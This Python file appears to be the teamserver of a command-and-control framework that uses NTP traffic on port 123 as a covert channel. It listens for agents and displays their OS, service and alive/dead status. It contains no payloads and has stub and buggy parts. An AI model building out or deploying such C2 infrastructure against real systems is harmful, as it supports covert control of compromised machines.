from teamserver import db
from server import ntpserver, listener

from termcolor import colored
from os import system
from threading import Thread
#from multiprocessing import Process # -> if needs more power

class Teamserver:
    def __init__(self):

        #try:
        self.agentDB = db.DB()
        system('clear')
        """
        except:
            print(colored("Problem connecting to the MySQL DB! \n"
                    "Make sure that the credentials entered are correct/MySQL Server is running. \n"
                    "Exiting...",
                    "red"))
            exit()
        """
        print("Listening for NTP traffic on port 123")
        self.thread = Thread(target=listener.start, args=(self.agentDB), daemon=True)
        self.thread.start()           
        system('clear')

    def getDBObj(self):
        return self.agentDB

    def getNTPServer(self):
        return self.NTPServer

    #display the board of active c2s, call again to refresh
    def displayBoard(self):
        data = self.agentDB.dbPull()
        if len(data) == 0:
            print(colored(" No Agents in DB!\n", "red"))
            return

        for entry in data:
            if entry[3] == "DEAD":
                color = "red"
            elif entry[3] == "ALIVE":
                color = "green"
            else:
                color = "yellow"

            print(colored(" Agent ~ " + str(entry[0]) + 
                            "\t| OS ~ " + str(entry[1]) + 
                            "\t| Service ~ " + str(entry[2]) + 
                            "\t| Status ~ " + str(entry[3]) + "\n"
                            , color=color))
    
    
    def printOutput(self): #?does this go somewhere else
        pass #print command output
        #take into account single/group (one/many) command responses

    def shutdown(self):
        self.thread.join()
        exit(0)